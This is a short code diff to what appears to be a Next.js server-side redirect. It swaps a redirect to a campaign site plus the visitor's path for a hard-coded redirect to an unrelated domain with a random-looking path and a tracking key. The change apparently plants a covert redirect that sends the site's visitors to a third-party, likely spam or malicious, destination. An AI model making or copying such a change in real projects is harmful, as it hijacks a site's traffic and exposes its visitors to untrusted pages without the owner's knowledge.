@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://gloriafreeway.com/yfh0b6pd?key=84364ad29efa7af0edca23b63743ffe7/`
 				}`,
 			},
 		};
